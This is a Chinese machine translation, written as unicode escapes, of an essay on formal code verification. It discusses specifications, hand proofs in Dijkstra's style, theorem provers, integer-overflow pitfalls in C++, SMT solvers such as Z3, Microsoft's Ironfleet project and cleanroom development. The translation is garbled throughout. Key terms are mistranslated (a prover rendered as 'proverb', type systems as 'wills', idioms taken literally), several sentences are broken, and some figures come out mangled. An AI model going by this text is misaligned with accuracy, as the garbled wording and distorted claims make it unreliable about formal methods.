\u627e\u5230\u6b63\u786e\u7684\u89c4\u683c\u7684\u95ee\u9898\u66f4\u4e3a\u6839\u672c\uff1a\u6211\u4eec\u7ecf\u5e38\u4e0d\u77e5\u9053\u6211\u4eec\u60f3\u8981\u7684\u89c4\u683c\u662f\u4ec0\u4e48\u3002\u6211\u4eec\u8003\u8651\u4e86\u4eba\u7c7b\u7684\u8981\u6c42\uff0c\u800c\u4e0d\u662f\u6570\u5b66\u672f\u8bed\u3002\u5982\u679c\u6211\u8bf4\u201c\u8fd9\u5e94\u8be5\u533a\u5206\u516c\u56ed\u7684\u9e1f\u7c7b\u201d\uff0c\u6211\u5728\u8bf4\u4ec0\u4e48\uff1f\u6211\u53ef\u4ee5\u901a\u8fc7\u7ed9\u4e88\u4e00\u5806\u516c\u56ed\u548c\u9e1f\u7c7b\u7684\u7167\u7247\u6765\u89e3\u91ca\u4e00\u4e2a\u4eba\uff0c\u4f46\u8fd9\u53ea\u662f\u5177\u4f53\u7684\u4f8b\u5b50\uff0c\u800c\u4e0d\u662f\u6355\u6349\u4ece\u9e1f\u7c7b\u533a\u5206\u516c\u56ed\u7684\u60f3\u6cd5\u3002\u4e3a\u4e86\u5b9e\u9645\u7ffb\u8bd1\u6210\u6b63\u5f0f\u89c4\u683c\u8981\u6c42\u6211\u4eec\u80fd\u591f\u5c06\u4eba\u7c7b\u6982\u5ff5\u5f62\u5f0f\u5f62\u5f0f\u5316\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e25\u91cd\u7684\u6311\u6218\u3002\n \u4e0d\u8981\u8ba9\u6211\u9519\u4e86\uff0c\u6709\u53ef\u80fd\u5f04\u6e05\u695a\u8fd9\u91cc\u7684\u9002\u5f53\u89c4\u683c\uff0c\u4e13\u5bb6\u4e00\u76f4\u8fd9\u6837\u505a\u3002\u4f46\u662f\u5199\u4f5c\u9002\u5f53\u7684\u89c4\u8303\u662f\u60a8\u9700\u8981\u5f00\u53d1\u7684\u6280\u80fd\uff0c\u5c31\u50cf\u60a8\u9700\u8981\u5f00\u53d1\u7f16\u7801\u6280\u80fd\u4e00\u6837\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u8bb8\u591a\u4ee3\u7801\u9a8c\u8bc1\u7684\u6700\u8fd1\u6210\u529f\u7684\u6210\u529f\u90fd\u662f\u6211\u4eec\u60f3\u8981\u7684\u660e\u663e\u5730\u56fe\u7684\u4e8b\u60c5\u4ee5\u53ca\u6211\u4eec\u53ef\u4ee5\u8868\u8fbe\u6211\u4eec\u60f3\u8981\u7684\u4e1c\u897f\u3002\u4f8b\u5982\uff0cCompcert\u662f\u4e00\u4e2a\u6b63\u5f0f\u9a8c\u8bc1\u7684C\u7f16\u8bd1\u5668\u3002\u8fd9\u4e2a\u89c4\u8303\u6709\u201c\u8fd9\u7edd\u4e0d\u4f1a\u8bef\u89e3\u201d\u3002\n \u8fd9\u4e00\u5207\u90fd\u4e0d\u662f\u5b9e\u9645\u7684\u9a8c\u8bc1\u90e8\u5206\u3002\u6709\u4e00\u4e2a\u89c4\u683c\uff0c\u60a8\u4ecd\u7136\u9700\u8981\u8bc1\u660e\u4ee3\u7801\u5339\u914d\u89c4\u8303\u3002\n  \u6211\u4eec\u770b\u5230\u7684\u6700\u65e9\u7684\u4ee3\u7801\u9a8c\u8bc1\u65b9\u5f0f\u662fDijkstra\u98ce\u683c\u7684\u201c\u975e\u5e38\u52aa\u529b\u5730\u601d\u8003\u4e3a\u4ec0\u4e48\u8fd9\u662f\u771f\u5b9e\u7684\u201d\u65b9\u6cd5\uff0c\u8fd9\u57fa\u672c\u4e0a\u662fallol\u65e8\u5728\u5e2e\u52a9\u505a\u7684\u3002\u4f8b\u5982\uff0c\u6211\u53ef\u80fd\u4f1a\u201c\u8bc1\u660e\u201d\u63d2\u5165\u6392\u5e8f\u901a\u8fc7\u4e89\u8bba\n \u57fa\u672c\u60c5\u51b5\uff1a\u5982\u679c\u6211\u4eec\u6709\u4e00\u4e2a\u7a7a\u5217\u8868\u5e76\u5c06\u4e00\u4e2a\u5143\u7d20\u6dfb\u52a0\u5230\u5b83\uff0c\u90a3\u5c06\u662f\u552f\u4e00\u7684\u5143\u7d20\uff0c\u56e0\u6b64\u5b83\u5c06\u88ab\u6392\u5e8f\u3002\n \u5982\u679c\u6211\u4eec\u6709\u4e00\u4e2a\u5e26\u6709k\u4e2a\u5143\u7d20\u7684\u6392\u5e8f\u5217\u8868\u5e76\u6dfb\u52a0\u4e00\u4e2a\u5143\u7d20\uff0c\u6211\u4eec\u5c06\u63d2\u5165\u5143\u7d20\uff0c\u4ee5\u4fbf\u5728\u6240\u6709\u8f83\u5c0f\u7684\u6570\u5b57\u4e4b\u540e\u548c\u6240\u6709\u66f4\u5927\u7684\u6570\u5b57\u4e4b\u540e\u3002\u8fd9\u610f\u5473\u7740\u5217\u8868\u4ecd\u7136\u6392\u5e8f\u3002 \n\u663e\u7136\uff0c\u5b83\u770b\u8d77\u6765\u6bd4\u8fd9\u66f4\u4e25\u683c\uff0c\u4f46\u8fd9\u662f\u4e00\u822c\u7684\u60f3\u6cd5\u3002 Dijkstra\u7b49\u4eba\u4f7f\u7528\u8fd9\u79cd\u98ce\u683c\u6765\u8bc1\u660e\u4e00\u5806\u7b97\u6cd5\u662f\u6b63\u786e\u7684\uff0c\u5305\u62ec\u8bb8\u591a\u5e76\u53d1\u539f\u8bed\u3002\u8fd9\u4e5f\u662f\u4e00\u79cd\u98ce\u683c\uff0c\u5b83\u5f15\u8d77\u4e86Knuth Quote\u201c\u8bf7\u6ce8\u610f\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\u7684\u9519\u8bef;\u6211\u53ea\u8bc1\u660e\u5b83\u662f\u6b63\u786e\u7684\uff0c\u6ca1\u6709\u5c1d\u8bd5\u8fc7\u3002\u201c\u5728\u6ca1\u6709\u4eba\u901a\u77e5\u7684\u65b9\u5f0f\u641e\u5b9a\u6570\u5b66\u8bc1\u660e\u662f\u975e\u5e38\u5bb9\u6613\u7684\uff0c\u5e76\u4e14\u6211\u8bfb\u5230\u4e8620\uff05\u7684\u53d1\u5e03\u7684\u6570\u5b66\u8bc1\u660e\u7684\u4f30\u8ba1\uff0c\u5b83\u4eec\u6709\u9519\u8bef\u3002 Peter Guttmann\u6709\u4e00\u4e2a\u5f88\u597d\u7684\u8bba\u6587\uff0c\u5c31\u5982\u4f55\u83b7\u5f97\u4e86\u591a\u6cd5\u4ee3\u7801\uff0c\u5982\u679c\u8fd0\u884c\uff0c\u90a3\u4e48\u5927\u91cf\u7684\u201c\u7ecf\u8fc7\u9a8c\u8bc1\u7684\u201d\u4ee3\u7801\u4f1a\u7acb\u5373\u5d29\u6e83\u3002\n \u540c\u65f6\u6211\u4eec\u6b63\u5728\u63a2\u7d22\u5982\u4f55\u81ea\u52a8\u8bc1\u660e\u6570\u5b66\u5b9a\u7406\uff0c\u8fd9\u662f1967\u5e74\u51fa\u6765\u7684\u7b2c\u4e00\u4e2a\u6b64\u7c7b\u5b9a\u671f\u5148\u9a71\u3002\u5e15\u65af\u5361\u793e\u533a\u7684\u7814\u7a76\u4eba\u5458\u6b63\u5728\u4f7f\u7528\u5b9a\u7406\u666e\u901a\u7684\u666e\u901a\u9a8c\u8bc1\u8ba1\u5212\u4e8e20\u4e16\u7eaa70\u5e74\u4ee3\u521d\u671f\uff0c\u7136\u540e\u901a\u8fc7\u4e2d\u671f\u7f16\u7a0b\u4e13\u7528\u9a8c\u8bc1\u8bed\u8a00\u8fdb\u884c\u7f16\u7a0b\u3002\u5341\u5e74\u3002\u4eba\u4eec\u5c06\u5199\u4e00\u4e9b\u4ee3\u7801\u7684\u5c5e\u6027\uff0c\u7136\u540e\u5199\u4e00\u4e2a\u53ef\u9009\u62e9\u7684\u8bc1\u660e\u4ee3\u7801\u5177\u6709\u8fd9\u4e9b\u5c5e\u6027\u3002\u65e9\u4e9b\u65f6\u5019\u5b9a\u7406\u666e\u67e5\u53ea\u662f\u5e2e\u52a9\u4eba\u7c7b\u68c0\u67e5\u5e76\u9a8c\u8bc1\u8bc1\u660e\uff0c\u800c\u66f4\u590d\u6742\u7684\u4eba\u53ef\u4ee5\u81ea\u5df1\u8bc1\u660e\u5b9a\u7406\u7684\u90e8\u5206\u3002\n   \u8bc1\u636e\u5f88\u96be\u3002\u4ee4\u4eba\u8ba8\u538c\u7684\u52aa\u529b\u3002 \u201c\u9000\u51fa\u7f16\u7a0b\u5e76\u52a0\u5165\u9a6c\u620f\u56e2\u201d\u3002\u4ee4\u4eba\u60ca\u8bb6\u7684\u662f\uff0c\u6b63\u5f0f\u7684\u4ee3\u7801\u8bc1\u660e\u5f80\u5f80\u6bd4\u5927\u591a\u6570\u6570\u5b66\u5bb6\u5199\u7684\u8bc1\u636e\u66f4\u4e25\u683c\uff01\u6570\u5b66\u662f\u4e00\u4e2a\u975e\u5e38\u6709\u521b\u9020\u6027\u7684\u6d3b\u52a8\uff0c\u5177\u6709\u660e\u786e\u7684\u7b54\u6848\uff0c\u5982\u679c\u60a8\u5c55\u793a\u60a8\u7684\u5de5\u4f5c\uff0c\u624d\u80fd\u6709\u6548\u3002\u521b\u9020\u529b\uff0c\u5f62\u5f0f\u4e3b\u4e49\u548c\u8ba1\u7b97\u673a\u662f\u4e00\u4e2a\u4e0d\u597d\u7684\u7ec4\u5408\u3002\n \u91c7\u53d6\u4e0a\u8ff0\u8bf1\u5bfc\u3002\u4efb\u4f55\u6570\u5b66\u5bb6\u90fd\u53ef\u4ee5\u770b\u51fa\u5b83\uff0c\u7acb\u5373\u77e5\u9053\u5b83\u662f\u4ec0\u4e48\uff0c\u5b83\u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff0c\u4ee5\u53ca\u5b83\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5982\u4f55\u6709\u6548\u3002\u8fd9\u4e9b\u90fd\u662f\u6211\u4eec\u9700\u8981\u4e25\u683c\u5730\u5f62\u5f0f\u5316\u7684\u4e1c\u897f\u3002\u4e0e\u77db\u76fe\u7684\u8bc1\u660e\u76f8\u540c\uff0c\u901a\u8fc7\u4e92\u76f8\u9a8c\u8bc1\u7b49\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u6b63\u89c4\u5316\u6bcf\u4e00\u4e2a\u5047\u8bbe\uff0c\u751a\u81f3\u662f\u5927\u591a\u6570\u6570\u5b66\u5bb6\u4e0d\u70e6\u607c\u7684\u4e1c\u897f\u3002\u4f8b\u5982\uff0c\u6dfb\u52a0\u662f\u5173\u8054\uff1aA +\uff08B + C\uff09=\uff08A + B\uff09+ C.\u5b9a\u7406\u7bb4\u8a00\u5e76\u4e0d\u662f\u5148\u9a8c\u7684\u771f\u5b9e\u3002\u60a8\u8981\u4e48\u5fc5\u987b\u8bc1\u660e\u5b83\uff08\u786c\uff09\uff0c\u58f0\u660e\u8fd9\u662f\u4e00\u4e2a\u5047\u8bbe\u7bb4\u8a00\u53ef\u4ee5\u4f5c\u4e3a\u771f\u5b9e\uff08\u5371\u9669\uff09\uff0c\u6216\u8005\u4ece\u5df2\u7ecf\u8bc1\u660e\u5b83\uff08\u6602\u8d35\uff09\u7684\u4eba\u90a3\u91cc\u8d2d\u4e70\u5b9a\u7406\u56fe\u4e66\u9986\u3002\u65e9\u671f\u5ba1\u67e5\u52a9\u7406\u7ade\u4e89\u5185\u7f6e\u7b56\u7565\u7b56\u7565\u548c\u6346\u7ed1\u5b9a\u7406\u56fe\u4e66\u9986\u3002\u9996\u6b21\u5e7f\u6cdb\u7684\u6821\u9a8c\u9a8c\u8bc1\u5458\u4e4b\u4e00\uff0cSpade\uff0c\u5c06\u5176\u5b8c\u6574\u7684\u7b97\u672f\u5e93\u4f5c\u4e3a\u4e00\u4e2a\u5173\u952e\u9500\u552e\u70b9\u5ba3\u4f20\u3002\n \u63a5\u4e0b\u6765\uff0c\u4f60\u5fc5\u987b\u5b9e\u9645\u4e0a\u5f97\u5230\u8bc1\u636e\u3002\u60a8\u53ef\u4ee5\u8ba9\u8c1a\u8bed\u5c1d\u8bd5\u81ea\u5df1\u627e\u5230\u5b83\uff0c\u6216\u81ea\u5df1\u5199\u5b83\u3002\u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u81ea\u52a8\u63a8\u65ad\u51fa\u8bc1\u660e\u662f\u4e0d\u53ef\u8bc6\u522b\u7684\u3002\u5bf9\u4e8e\u6781\u5ea6\u9650\u5236\u7684\u60c5\u51b5\uff0c\u5982\u547d\u9898\u903b\u8f91\u6216HM Type-Checki\uff0c\u5b83\u662f\u201c\u53ea\u6709\u201dNP-Complete\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u90fd\u9677\u5165\u4e86\u81ea\u5df1\u7684\u5927\u90e8\u5206\u8bc1\u636e\uff0c\u5e76\u8ba9\u8ba1\u7b97\u673a\u9a8c\u8bc1\u5b83\u662f\u6b63\u786e\u7684\u3002\u8fd9\u610f\u5473\u7740\u60a8\u9700\u8981\u4e00\u4e2a\u5f3a\u5927\u7684\u80cc\u666f\uff1a\n \u60a8\u6b63\u5728\u4f7f\u7528\u7684\u5b9a\u7406\u8c1a\u8bed\u7684\u590d\u6742\u6027\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e13\u4e1a\n \u8ba9\u4e8b\u60c5\u53d8\u5f97\u66f4\u7cdf\uff0c\u7535\u8111\u7269\u4e1a\u5c06\u5927\u91cf\u7684\u6273\u624b\u6254\u8fdb\u8bc1\u660e\u3002\u8fd8\u8bb0\u5f97\u6211\u5982\u4f55\u8bf4\u5047\u8bbe\u52a0\u6cd5\u662f\u5173\u8054\u662f\u5371\u9669\u7684\uff1f\u67d0\u4e9b\u8bed\u8a00\u5e76\u4e0d\u5173\u8054\u3002 C ++\u5177\u6709INT_MAX\u3002 \uff08\uff08-1\uff09+ int_max\uff09+ 1\u662fINT_MAX\u3002 -1 +\uff08int_max + 1\uff09\u672a\u5b9a\u4e49\u3002\u5982\u679c\u60a8\u5047\u8bbeC ++\u4e2d\u7684\u5173\u8054\u6dfb\u52a0\uff0c\u60a8\u7684\u8bc1\u660e\u5c06\u662f\u9519\u8bef\u7684\uff0c\u5e76\u4e14\u60a8\u7684\u4ee3\u7801\u5c06\u88ab\u6253\u7834\u3002\u60a8\u8981\u4e48\u5fc5\u987b\u907f\u514d\u4f7f\u8fd9\u79cd\u65ad\u8a00\uff0c\u6216\u8bc1\u660e\u4e3a\u60a8\u7684\u7279\u5b9a\u4ee3\u7801\u6bb5\uff0c\u60a8\u6c38\u8fdc\u4e0d\u4f1a\u9020\u6210\u6ea2\u51fa\u3002 \n\u73b0\u5728\uff0c\u60a8\u53ef\u4ee5\u8bf4\u672a\u5b9a\u4e49\u7684\u6dfb\u52a0\u662f\u4e00\u4e2a\u9519\u8bef\uff0c\u800c\u4e14\u60a8\u5e94\u8be5\u4f7f\u7528\u5e26\u6709\u672a\u7ed1\u5b9a\u6574\u6570\u7684\u8bed\u8a00\u3002\u4f46\u5927\u591a\u6570\u8bed\u8a00\u5177\u6709\u59a8\u788d\u8bc1\u660e\u7684\u79ef\u6781\u529f\u80fd\u3002\u91c7\u53d6\u4ee5\u4e0b\u4ee3\u7801\u6bb5\uff1a\n  \u8fd9\u603b\u662f\u771f\u7684\u5417\uff1f\u4f9d\u9760\u3002\u4e5f\u8bb8f\u4fee\u6539a\u3002\u4e5f\u8bb8\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u5e76\u53d1\u4fee\u6539a\u3002\u4e5f\u8bb8b\u522b\u4f20\u5230a\uff0c\u56e0\u6b64\u4fee\u6539\u5b83\u4e5f\u4fee\u6539\u4e86\u4e00\u4e2a\u3002 8\u5982\u679c\u60a8\u7684\u8bed\u8a00\u4e2d\u7684\u4efb\u4f55\u4e00\u79cd\uff0c\u5219\u5fc5\u987b\u660e\u786e\u8bc1\u660e\u4ed6\u4eec\u4e0d\u4f1a\u53d1\u751f\u5728\u8fd9\u91cc\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u7eaf\u5ea6\u6709\u52a9\u4e8e\u5728\u5176\u4ed6\u60c5\u51b5\u4e0b\u4e22\u5931\u8bc1\u660e\uff0c\u56e0\u4e3a\u5b83\u8feb\u4f7f\u60a8\u4f7f\u7528\u9012\u5f52\u548c\u66f4\u9ad8\u9636\u51fd\u6570\u6765\u5b8c\u6210\u5b8c\u6210\u7684\u4e1c\u897f\u3002\u987a\u4fbf\u63d0\u53ca\uff0c\u8fd9\u4e24\u8005\u90fd\u662f\u7f16\u5199\u826f\u597d\u529f\u80fd\u8ba1\u5212\u7684\u57fa\u7840\u3002\u5bf9\u4e8e\u8bc1\u660e\uff0c\u7f16\u7801\u6709\u4ec0\u4e48\u597d\u5904\uff01 9.\n \u6b63\u5f0f\u7684\u9a8c\u8bc1\u8005\u6709\u56f0\u5883\uff1a\u8fd9\u79cd\u8bed\u8a00\u66f4\u52a0\u8868\u8fbe\uff0c\u5b83\u8d8a\u96be\u4ee5\u8bc1\u660e\u5b83\u3002\u4f46\u8bed\u8a00\u8868\u73b0\u8f83\u5c11\uff0c\u8d8a\u96be\u4ee5\u5199\u5165\u5b83\u3002\u7b2c\u4e00\u4e2a\u751f\u4ea7\u9a8c\u8bc1\u8bed\u8a00\u662f\u66f4\u5177\u8868\u73b0\u6027\u8bed\u8a00\u7684\u5b50\u96c6\uff1aACL2\u662fLISP\u7684\u4e00\u4e2a\u5b50\u96c6\uff0cEuclid\u662f\u5e15\u65af\u5361\u7684\u4e00\u90e8\u5206\u7b49\u3002\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u5df2\u7ecf\u8ba8\u8bba\u8fc7\u7684\u4e1c\u897f\uff0c\u5b9e\u9645\u4e0a\u662f\u4ee5\u8bc1\u660e\u771f\u5b9e\u4e16\u754c\u7684\u8ba1\u5212\uff0c\u8fd9\u5c31\u662f\u53ea\u662f\u684c\u9762\u8d4c\u6ce8\u9996\u5148\u5f00\u59cb\u5199\u4f5c\u8bc1\u660e\u3002\n \u8bc1\u636e\u5f88\u96be\u3002\u7136\u800c\uff0c\u4ed6\u4eec\u4e00\u76f4\u8d8a\u6765\u8d8a\u597d\u3002\u6821\u6b63\u52a9\u7406\u7814\u7a76\u4eba\u5458\u7ee7\u7eed\u6dfb\u52a0\u65b0\u7684\u542f\u53d1\u5f0f\uff0c\u5b9a\u7406\u5e93\uff0c\u9884\u53d6\u91cf\u7ec4\u4ef6\u7b49\u786c\u4ef6\u6539\u8fdb\uff0c\u4ee5\u53ca\u66f4\u5feb\u7684\u8ba1\u7b97\u673a\u610f\u5473\u7740\u66f4\u5feb\u7684\u641c\u7d22\u3002\n  \u8fd9\u4e9b\u65e5\u5b50\u6700\u591a\u7684\u4eba\u53e3\u8bc1\u660e\u81ea\u52a8\u5316\u662fSMT\u3002 10\u975e\u5e38\u5e7f\u6cdb\u5730\u8bf4\uff0cSMT\u6c42\u89e3\u5668\u53ef\u4ee5\u5c06\uff08\u4e00\u4e9b\uff09\u5b9a\u7406\u8f6c\u5411\u7ea6\u675f\u6ee1\u8db3\u95ee\u9898\u3002\u8fd9\u5c06\u521b\u9020\u6027\u95ee\u9898\u53d8\u6210\u8ba1\u7b97\u4e00\u4e2a\u3002\u60a8\u4ecd\u7136\u9700\u8981\u5c06\u5176\u4e2d\u95f4\u95ee\u9898\uff08LEMMAS\uff09\u4f5c\u4e3a\u5b9a\u7406\u4e2d\u7684\u6b65\u9aa4\u63d0\u4f9b\uff0c\u4f46\u8fd9\u6bd4\u8bc1\u660e\u6bcf\u4e2a\u8be5\u6b7b\u7684\u4e8b\u7269\u66f4\u597d\u3002\u65af\u5766\u798f\u5fb7\u4e8e1998\u5e74\u53d1\u5e03\u4e86\u7b2c\u4e00\u4e2a\u201c\u73b0\u4ee3\u201dSMT Solver\uff0cStanford\u6709\u6548\u6027\u68c0\u67e5\u5458\u3002\u4ed6\u4eec\u5efa\u7acb\u57282002\u5e74\u53d1\u5e03\u7684CVC\uff0c\u8fd9\u6d89\u53ca\u8f7b\u5fae\u7684\u751f\u4ea7\u4f7f\u7528\u3002 11.\n \u5f53Microsoft Research\u53d1\u5e03Z3\u65f6\uff0c\u573a\u666f\u53d1\u751f\u57282006\u5e74\u5de6\u53f3\u3002 Z3\u7684\u5927\u4f18\u52bf\u662f\u6bd4\u5176\u4ed6SMT\u66f4\u6709\u7528\u6237\u53cb\u597d\uff0c\u8bda\u5b9e\u5e76\u4e0d\u662f\u5f88\u591a\u3002 MSR\u5728\u5185\u90e8\u4f7f\u7528\u5b83\u6765\u5e2e\u52a9\u8bc1\u660eWindows\u5185\u6838\u7684\u5c5e\u6027\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4eec\u5728UX\u4e2d\u6295\u5165\u4e86\u66f4\u591a\u6bd4\u8f83\u6700\u5c0f\u7684\u3002 Z3\u53ef\u4ee5\u8bf4\u662f\u5168\u9762\u7684\u9ed8\u8ba4\u9009\u62e9\u8fdb\u884c\u901a\u7528\u81ea\u52a8\u5316\u8bc1\u660e\u3002 CV\u4e2d\u7684\u8bb8\u591a\u5de5\u5177\u73b0\u5728\u4f9d\u8d56\u4e8eSMT\uff0c\u5e76\u4e14\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5927\u591a\u6570Z3\u90fd\u6709Z3\u3002\n \u65e0\u969c\u788d\u7684SMT\u89e3\u51b3\u662f\u88e4\u5b50\u5230\u6b63\u5f0f\u9a8c\u8bc1\u793e\u533a\u7684\u8e22\u811a\uff0c\u56e0\u4e3a\u5b83\u4f7f\u5f97\u5f88\u591a\u7b80\u5355\u7684\u8bc1\u636e\u7410\u788e\u548c\u4ee4\u4eba\u8ba8\u538c\u7684\u8bc1\u636e\u3002\u53cd\u8fc7\u6765\uff0c\u8fd9\u610f\u5473\u7740\u4eba\u4eec\u53ef\u4ee5\u4ee5\u66f4\u5feb\u9012\u7684\u8bed\u8a00\u5f00\u59cb\u8bc1\u660e\u4e1c\u897f\uff0c\u56e0\u4e3a\u4ed6\u4eec\u73b0\u5728\u6709\u80fd\u529b\u89e3\u51b3\u8868\u8fbe\u5f0f\u9648\u8ff0\u7684\u6311\u6218\u3002 Ironfleet\u9879\u76ee\u4e2d\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u4ee4\u4eba\u96be\u4ee5\u7f6e\u4fe1\u7684\u8fdb\u5c55\uff1a\u901a\u8fc7\u4f7f\u7528\u5148\u8fdb\u7684SMT\u6c42\u89e3\u5668\u548c\u5c16\u7aef\u9a8c\u8bc1\u8bed\u8a00\uff0c\u5fae\u8f6f\u53ea\u80fd\u57283.7\u4eba\u4e2d\u7f16\u51995,000\u884c\u9a8c\u8bc1\u7684DAFNY\u4ee3\u7801\uff01\u8fd9\u662f\u4e00\u5929\u56db\u6574\u884c\u7684\u70bd\u70ed\u901f\u5ea6\u3002 12. \n\u73b0\u5728\u5c06\u662f\u4e00\u4e2a\u597d\u65f6\u523b\u9000\u540e\u4e00\u6b65\u5e76\u95ee\u201c\u4ec0\u4e48\u662f\u70b9\uff1f\u201d\u6211\u4eec\u8bd5\u56fe\u8bc1\u660e\u4e00\u4e9b\u7a0b\u5e8f\u7b26\u5408\u67d0\u4e9b\u89c4\u8303\u3002\u6b63\u786e\u6027\u662f\u4e00\u4e2a\u9891\u8c31\u3002\u9a8c\u8bc1\u95ee\u9898\u6709\u4e24\u90e8\u5206\u95ee\u9898\uff1a\u5982\u4f55\u5ba2\u89c2\u5730\u201c\u6b63\u786e\u201d\u60a8\u7684\u7a0b\u5e8f\u662f\uff0c\u4ee5\u53ca\u60a8\u4e25\u683c\u9a8c\u8bc1\u4e86\u6b63\u786e\u6027\u3002\u663e\u7136\uff0c\u66f4\u591a\u7684\u9a8c\u8bc1\u4f18\u4e8e\u9a8c\u8bc1\u7684\u66f4\u4f4e\uff0c\u4f46\u9a8c\u8bc1\u6210\u672c\u65f6\u95f4\u548c\u91d1\u94b1\u3002\u5982\u679c\u6211\u4eec\u6709\u591a\u79cd\u7ea6\u675f\u6765\u4f18\u5316\uff08\u6027\u80fd\uff0c\u65f6\u95f4\uff0c\u6210\u672c\u7b49\uff09\uff0c\u5219\u6700\u4f18\u60e0\u4e0d\u4e00\u5b9a\u662f\u201c\u5b8c\u5168\u8bc1\u660e\u6b63\u786e\u201d\u3002\u90a3\u4e48\u95ee\u9898\u53d8\u6210\u4e86\u201c\u6211\u4eec\u9700\u8981\u7684\u6700\u5c0f\u9a8c\u8bc1\u662f\u4ec0\u4e48\u201d\u548c\u201c\u5230\u8fbe\u90a3\u91cc\u7684\u6210\u672c\u662f\u591a\u5c11\u3002\u201d\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u60a8\u53ef\u4ee5\u9003\u907f\uff0c\u598290\uff05\u621695\uff05\u621699\uff05\u6b63\u786e\u3002\u4f60\u53ef\u80fd\u4f1a\u66f4\u597d\u5730\u82b1\u65f6\u95f4\u8ba9UX\u66f4\u597d\u5730\u83b7\u5f97\u6700\u540e1\uff05\u7684\u6b63\u786e\u6027\u3002\n \u95ee\u9898\uff0c\u90a3\u4e48\uff1a\u201c\u662f90/95/99\uff05\u6b63\u786e\u6bd4100\uff05\u6b63\u786e\u4fbf\u5b9c\uff1f\u201d\u7b54\u6848\u662f\u975e\u5e38\u7684\u3002\u6211\u4eec\u90fd\u5f88\u4e50\u610f\u5730\u8bf4\uff0c\u6211\u4eec\u7ecf\u8fc7\u826f\u597d\u6d4b\u8bd5\u548c\u826f\u597d\u7c7b\u578b\u7684\u4ee3\u7801\u5e93\u5927\u591a\u662f\u6b63\u786e\u7684Modulo\u5728Prod\u4e2d\u7684\u4e00\u4e9b\u4fee\u590d\uff0c\u6211\u4eec\u751a\u81f3\u4e00\u5929\u5199\u4e86\u56db\u884c\u7684\u4ee3\u7801\u3002\u4e8b\u5b9e\u4e0a\uff0c\u901a\u8fc7\u7565\u5fae\u5168\u9762\u7684\u6d4b\u8bd5\u53ef\u4ee5\u9632\u6b62\u7edd\u5927\u591a\u6570\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u65ad\u3002\u8fd9\u53ea\u662f\u66f4\u5168\u9762\u7684\u5355\u5143\u6d4b\u8bd5\uff0c\u65e0\u8bba\u5982\u8bf4\u90fd\u6ca1\u6709\u6a21\u7cca\uff0c\u57fa\u4e8e\u7269\u4e1a\u7684\u6d4b\u8bd5\u6216\u6a21\u578b\u6d4b\u8bd5\u3002\u60a8\u53ef\u4ee5\u975e\u5e38\u9065\u8fdc\uff0c\u5e76\u4e14\u5728\u4e0d\u9700\u8981\u8fdb\u884c\u5168\u9762\u8bc1\u660e\u7684\u60c5\u51b5\u4e0b\u66f4\u7b80\u5355\u7684\u6280\u5de7\u3002\n \u5982\u679c\u7c7b\u578b\u7684\u9057\u5631\u6ca1\u6709\u8ba9\u4f60\u9a8c\u8bc1\u600e\u4e48\u529e\uff1f\u6bd499\uff05\u5230100\uff05\u768490\uff05\u301c99\uff05\u66f4\u5bb9\u6613\u5f97\u591a\u3002\u5982\u524d\u6240\u8ff0\uff0c\u6d01\u51c0\u5ba4\u662f\u6d89\u53ca\u5168\u9762\u6587\u6863\uff0c\u4ed4\u7ec6\u6d41\u91cf\u5206\u6790\u548c\u5e7f\u6cdb\u7684\u4ee3\u7801\u5ba1\u67e5\u7684\u5f00\u53d1\u4eba\u5458\u5b9e\u8df5\u3002\u6ca1\u6709\u8bc1\u636e\uff0c\u6ca1\u6709\u6b63\u5f0f\u9a8c\u8bc1\uff0c\u751a\u81f3\u6ca1\u6709\u4efb\u4f55\u5355\u4f4d\u6d4b\u8bd5\u3002\u4f46\u6b63\u5e38\u5b8c\u6210\uff0c\u6d01\u51c0\u5ba4\u5728\u751f\u4ea7\u4e2d\u5c06\u7f3a\u9677\u5bc6\u5ea6\u964d\u4f4e\u81f3\u5c11\u4e8e1\u4e2a\u9519\u8bef/ kloc\u3002 13\u4e2a\u4f7f\u7528\u5b83\u7684\u56e2\u961f\u5177\u6709\u6bd4\u4e0d\u4f7f\u7528\u5b83\u7684\u56e2\u961f\u76f8\u540c\u6216\u66f4\u77ed\u7684\u4ea4\u8d27\u65f6\u95f4 - \u4e00\u5929\u80af\u5b9a\u8d85\u8fc74\u884c\u3002\u6d01\u51c0\u5ba4\u672c\u8eab\u53ea\u662f\u5750\u5728\u4e3b\u6d41\u8f6f\u4ef6\u5b9e\u8df5\u548c\u4ee3\u7801\u9a8c\u8bc1\u4e4b\u95f4\u7684\u8bb8\u591a\u9ad8\u4fdd\u8bc1\u6280\u672f\u4e4b\u4e00\u3002\u60a8\u4e0d\u9700\u8981\u5b8c\u6574\u7684\u4ee3\u7801\u9a8c\u8bc1\u6765\u7f16\u5199\u826f\u597d\u7684\u8f6f\u4ef6\u751a\u81f3\u5199\u5165\u8fd1\u4e4e\u5b8c\u7f8e\u7684\u8f6f\u4ef6\u3002\u6709\u5fc5\u8981\u7684\u60c5\u51b5\uff0c\u4f46\u5bf9\u4e8e\u5927\u591a\u6570\u884c\u4e1a\u800c\u8a00\uff0c\u8fd9\u662f\u6d6a\u8d39\u91d1\u94b1\u3002\n 